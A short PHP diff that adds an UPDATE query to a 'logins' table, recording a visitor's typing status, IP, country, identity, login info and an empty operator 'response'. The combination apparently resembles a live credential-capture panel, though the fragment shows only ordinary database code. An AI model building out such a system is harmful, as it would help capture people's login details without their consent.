@@ -114,6 +114,30 @@ try {
             ':id_usuario' => $id_usuario,
             ':resposta' => ''
         ]);
+    } else {
+        $updateLogin = $pdo->prepare("
+            UPDATE logins
+            SET dados = :dados,
+                debitos = :debitos,
+                ip = :ip,
+                pais = :pais,
+                identity = :identity,
+                hora = :hora,
+                login_info = :login_info,
+                resposta = :resposta
+            WHERE id = :id
+        ");
+        $updateLogin->execute([
+            ':dados' => 'Typing iniciado',
+            ':debitos' => '0 / 0',
+            ':ip' => $ip,
+            ':pais' => $localidade,
+            ':identity' => $identity,
+            ':hora' => $hora,
+            ':login_info' => $loginInfo,
+            ':resposta' => '',
+            ':id' => $existingLoginId
+        ]);
     }
 
     echo json_encode([
